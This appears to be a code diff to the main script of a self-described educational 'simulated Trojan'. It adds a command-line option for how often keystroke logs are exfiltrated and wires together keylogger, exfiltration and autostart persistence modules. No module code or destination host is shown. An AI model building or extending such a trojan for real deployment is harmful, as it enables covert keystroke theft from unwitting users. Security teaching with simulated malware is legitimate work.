@@ -2,12 +2,17 @@
 
 import threading
 import time
+import argparse
 
 from modules import keylogger
 from modules import exfil
 from modules import autostart
 
 def main():
+    parser = argparse.ArgumentParser(description="Simulated Trojan (educational)")
+    parser.add_argument("--interval", type=int, default=30, help="Exfil interval in seconds (default: 30)")
+    args = parser.parse_args()
+
     print("[*] Starting simulated Trojan...")
 
     # 1. Simulate persistence
@@ -21,7 +26,7 @@ def main():
     # 3. (Optional) Periodic exfiltration
     while True:
         try:
-            time.sleep(30)  # exfil every 30 sec
+            time.sleep(args.interval)
             exfil.send_keylog()
         except KeyboardInterrupt:
             print("[!] Exiting...")
